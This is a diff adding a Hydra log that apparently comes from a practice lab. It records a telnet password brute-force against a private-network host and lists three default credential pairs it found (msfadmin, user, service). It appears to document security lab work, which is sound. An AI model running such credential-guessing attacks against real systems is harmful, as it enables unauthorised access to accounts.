@@ -1,0 +1,11 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-20 02:00:58
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 151 login tries, ~4 tries per task
+[DATA] attacking telnet://192.168.1.122:23/
+[23][telnet] host: 192.168.1.122   login: msfadmin   password: msfadmin
+[23][telnet] host: 192.168.1.122   login: user   password: user
+[23][telnet] host: 192.168.1.122   login: service   password: service
+1 of 1 target successfully completed, 3 valid passwords found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-20 02:01:10
